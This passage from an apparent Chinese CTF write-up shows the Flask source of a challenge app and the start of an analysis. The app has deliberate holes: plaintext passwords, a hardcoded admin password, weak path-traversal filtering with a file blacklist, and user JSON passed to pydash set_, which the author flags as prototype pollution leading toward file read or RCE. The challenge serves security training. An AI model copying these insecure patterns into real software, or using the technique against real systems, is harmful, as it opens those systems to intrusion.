</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>method</span> <span class=o>==</span> <span class=s1>&#39;POST&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>username</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>password</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>users</span><span class=p>[</span><span class=n>username</span><span class=p>]</span> <span class=o>=</span> <span class=n>password</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;login&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;register.html&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/change_password&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>change_password</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s1>&#39;username&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>session</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;login&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>method</span> <span class=o>==</span> <span class=s1>&#39;POST&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>old_password</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>[</span><span class=s1>&#39;old_password&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>new_password</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>[</span><span class=s1>&#39;new_password&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>confirm_password</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>[</span><span class=s1>&#39;confirm_password&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>users</span><span class=p>[</span><span class=n>session</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]]</span> <span class=o>!=</span> <span class=n>old_password</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>flash</span><span class=p>(</span><span class=s2>&#34;Old password is incorrect&#34;</span><span class=p>,</span> <span class=s2>&#34;error&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>new_password</span> <span class=o>!=</span> <span class=n>confirm_password</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>flash</span><span class=p>(</span><span class=s2>&#34;New passwords do not match&#34;</span><span class=p>,</span> <span class=s2>&#34;error&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>users</span><span class=p>[</span><span class=n>session</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]]</span> <span class=o>=</span> <span class=n>new_password</span>
</span></span><span class=line><span class=cl>            <span class=n>flash</span><span class=p>(</span><span class=s2>&#34;Password changed successfully&#34;</span><span class=p>,</span> <span class=s2>&#34;success&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;index&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;change_password.html&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/friendlinks&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>friendlinks</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s1>&#39;username&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>session</span> <span class=ow>or</span> <span class=n>session</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span> <span class=o>!=</span> <span class=s1>&#39;admin&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;login&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;friendlinks.html&#39;</span><span class=p>,</span> <span class=n>links</span><span class=o>=</span><span class=n>friend_links</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/add_friendlink&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add_friendlink</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s1>&#39;username&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>session</span> <span class=ow>or</span> <span class=n>session</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span> <span class=o>!=</span> <span class=s1>&#39;admin&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;login&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>name</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;name&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;url&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>name</span> <span class=ow>and</span> <span class=n>url</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>friend_links</span><span class=o>.</span><span class=n>append</span><span class=p>({</span><span class=s2>&#34;name&#34;</span><span class=p>:</span> <span class=n>name</span><span class=p>,</span> <span class=s2>&#34;url&#34;</span><span class=p>:</span> <span class=n>url</span><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;friendlinks&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/delete_friendlink/&lt;int:index&gt;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete_friendlink</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s1>&#39;username&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>session</span> <span class=ow>or</span> <span class=n>session</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span> <span class=o>!=</span> <span class=s1>&#39;admin&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;login&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=mi>0</span> <span class=o>&lt;=</span> <span class=n>index</span> <span class=o>&lt;</span> <span class=nb>len</span><span class=p>(</span><span class=n>friend_links</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>del</span> <span class=n>friend_links</span><span class=p>[</span><span class=n>index</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;friendlinks&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/article&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>article</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s1>&#39;username&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>session</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;login&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>file_name</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;file&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>file_name</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;article.html&#39;</span><span class=p>,</span> <span class=n>file_name</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=n>content</span><span class=o>=</span><span class=s2>&#34;未提供文件名。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>blacklist</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;waf.py&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>any</span><span class=p>(</span><span class=n>blacklisted_file</span> <span class=ow>in</span> <span class=n>file_name</span> <span class=k>for</span> <span class=n>blacklisted_file</span> <span class=ow>in</span> <span class=n>blacklist</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;article.html&#39;</span><span class=p>,</span> <span class=n>file_name</span><span class=o>=</span><span class=n>file_name</span><span class=p>,</span> <span class=n>content</span><span class=o>=</span><span class=s2>&#34;大黑阔不许看&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>file_name</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s1>&#39;articles/&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;article.html&#39;</span><span class=p>,</span> <span class=n>file_name</span><span class=o>=</span><span class=n>file_name</span><span class=p>,</span> <span class=n>content</span><span class=o>=</span><span class=s2>&#34;无效的文件路径。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>file_name</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>articles</span><span class=o>.</span><span class=n>values</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;username&#39;</span><span class=p>)</span> <span class=o>!=</span> <span class=s1>&#39;admin&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;article.html&#39;</span><span class=p>,</span> <span class=n>file_name</span><span class=o>=</span><span class=n>file_name</span><span class=p>,</span> <span class=n>content</span><span class=o>=</span><span class=s2>&#34;无权访问该文件。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>file_path</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>BASE_DIR</span><span class=p>,</span> <span class=n>file_name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>file_path</span> <span class=o>=</span> <span class=n>file_path</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;../&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>file_path</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>content</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>FileNotFoundError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>content</span> <span class=o>=</span> <span class=s2>&#34;文件未找到。&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>app</span><span class=o>.</span><span class=n>logger</span><span class=o>.</span><span class=n>error</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Error reading file </span><span class=si>{</span><span class=n>file_path</span><span class=si>}</span><span class=s2>: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>content</span> <span class=o>=</span> <span class=s2>&#34;读取文件时发生错误。&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;article.html&#39;</span><span class=p>,</span> <span class=n>file_name</span><span class=o>=</span><span class=n>file_name</span><span class=p>,</span> <span class=n>content</span><span class=o>=</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/Admin&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>admin</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;pass&#39;</span><span class=p>)</span><span class=o>!=</span><span class=s2>&#34;SUers&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;nonono&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>method</span> <span class=o>==</span> <span class=s1>&#39;POST&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>body</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>json</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=n>body</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>flash</span><span class=p>(</span><span class=s2>&#34;No JSON data received&#34;</span><span class=p>,</span> <span class=s2>&#34;error&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s2>&#34;message&#34;</span><span class=p>:</span> <span class=s2>&#34;No JSON data received&#34;</span><span class=p>}),</span> <span class=mi>400</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>key</span> <span class=o>=</span> <span class=n>body</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;key&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>value</span> <span class=o>=</span> <span class=n>body</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;value&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>key</span> <span class=ow>is</span> <span class=kc>None</span> <span class=ow>or</span> <span class=n>value</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>flash</span><span class=p>(</span><span class=s2>&#34;Missing required keys: &#39;key&#39; or &#39;value&#39;&#34;</span><span class=p>,</span> <span class=s2>&#34;error&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s2>&#34;message&#34;</span><span class=p>:</span> <span class=s2>&#34;Missing required keys: &#39;key&#39; or &#39;value&#39;&#34;</span><span class=p>}),</span> <span class=mi>400</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=n>pwaf</span><span class=p>(</span><span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>flash</span><span class=p>(</span><span class=s2>&#34;Invalid key format&#34;</span><span class=p>,</span> <span class=s2>&#34;error&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s2>&#34;message&#34;</span><span class=p>:</span> <span class=s2>&#34;Invalid key format&#34;</span><span class=p>}),</span> <span class=mi>400</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=n>cwaf</span><span class=p>(</span><span class=n>value</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>flash</span><span class=p>(</span><span class=s2>&#34;Invalid value format&#34;</span><span class=p>,</span> <span class=s2>&#34;error&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s2>&#34;message&#34;</span><span class=p>:</span> <span class=s2>&#34;Invalid value format&#34;</span><span class=p>}),</span> <span class=mi>400</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>set_</span><span class=p>(</span><span class=n>user_data</span><span class=p>,</span> <span class=n>key</span><span class=p>,</span> <span class=n>value</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>flash</span><span class=p>(</span><span class=s2>&#34;User data updated successfully&#34;</span><span class=p>,</span> <span class=s2>&#34;success&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s2>&#34;message&#34;</span><span class=p>:</span> <span class=s2>&#34;User data updated successfully&#34;</span><span class=p>}),</span> <span class=mi>200</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=n>json</span><span class=o>.</span><span class=n>JSONDecodeError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>flash</span><span class=p>(</span><span class=s2>&#34;Invalid JSON data&#34;</span><span class=p>,</span> <span class=s2>&#34;error&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s2>&#34;message&#34;</span><span class=p>:</span> <span class=s2>&#34;Invalid JSON data&#34;</span><span class=p>}),</span> <span class=mi>400</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>flash</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;An error occurred: </span><span class=si>{</span><span class=nb>str</span><span class=p>(</span><span class=n>e</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;error&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s2>&#34;message&#34;</span><span class=p>:</span> <span class=sa>f</span><span class=s2>&#34;An error occurred: </span><span class=si>{</span><span class=nb>str</span><span class=p>(</span><span class=n>e</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>}),</span> <span class=mi>500</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;admin.html&#39;</span><span class=p>,</span> <span class=n>user_data</span><span class=o>=</span><span class=n>user_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/logout&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>logout</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>session</span><span class=o>.</span><span class=n>pop</span><span class=p>(</span><span class=s1>&#39;username&#39;</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>flash</span><span class=p>(</span><span class=s2>&#34;You have been logged out.&#34;</span><span class=p>,</span> <span class=s2>&#34;info&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;login&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span><span class=n>port</span><span class=o>=</span><span class=mi>5000</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>可以直接看到有pydash，其中导入了<code>set_</code>，然后不断跟进到<code>update_with</code>，发现这个东西很像merge函数，那么这里的考点应该就是原型链污染了，但是可以很明显的看到，这里是有waf的，要绕过waf进行文件读取或者是RCE</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>update_with</span><span class=p>(</span><span class=n>obj</span><span class=p>,</span> <span class=n>path</span><span class=p>,</span> <span class=n>updater</span><span class=p>,</span> <span class=n>customizer</span><span class=o>=</span><span class=kc>None</span><span class=p>):</span>  <span class=c1># noqa: C901</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    This method is like :func:`update` except that it accepts customizer which is invoked to produce
</span></span></span><span class=line><span class=cl><span class=s2>    the objects of path. If customizer returns ``None``, path creation is handled by the method
</span></span></span><span class=line><span class=cl><span class=s2>    instead. The customizer is invoked with three arguments: ``(nested_value, key, nested_object)``.
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    Args:
</span></span></span><span class=line><span class=cl><span class=s2>        obj (list|dict): Object to modify.
</span></span></span><span class=line><span class=cl><span class=s2>        path (str|list): A string or list of keys that describe the object path to modify.
</span></span></span><span class=line><span class=cl><span class=s2>        updater (callable): Function that returns updated value.
</span></span></span><span class=line><span class=cl><span class=s2>        customizer (callable, optional): The function to customize assigned values.
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    Returns:
</span></span></span><span class=line><span class=cl><span class=s2>        mixed: Updated `obj`.
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    Warning:
</span></span></span><span class=line><span class=cl><span class=s2>        `obj` is modified in place.
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    Example:
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>        &gt;&gt;&gt; update_with(</span><span class=si>{}</span><span class=s2>, &#39;[0][1]&#39;, lambda: &#39;a&#39;, lambda: </span><span class=si>{}</span><span class=s2>)
</span></span></span><span class=line><span class=cl><span class=s2>        {0: {1: &#39;a&#39;}}
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    .. versionadded:: 4.0.0
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>callable</span><span class=p>(</span><span class=n>updater</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>updater</span> <span class=o>=</span> <span class=n>pyd</span><span class=o>.</span><span class=n>constant</span><span class=p>(</span><span class=n>updater</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>customizer</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span> <span class=ow>and</span> <span class=ow>not</span> <span class=n>callable</span><span class=p>(</span><span class=n>customizer</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>call_customizer</span> <span class=o>=</span> <span class=n>partial</span><span class=p>(</span><span class=n>callit</span><span class=p>,</span> <span class=n>clone</span><span class=p>,</span> <span class=n>customizer</span><span class=p>,</span> <span class=n>argcount</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>customizer</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>call_customizer</span> <span class=o>=</span> <span class=n>partial</span><span class=p>(</span><span class=n>callit</span><span class=p>,</span> <span class=n>customizer</span><span class=p>,</span> <span class=n>argcount</span><span class=o>=</span><span class=n>getargcount</span><span class=p>(</span><span class=n>customizer</span><span class=p>,</span> <span class=n>maxargs</span><span class=o>=</span><span class=mi>3</span><span class=p>))</span>
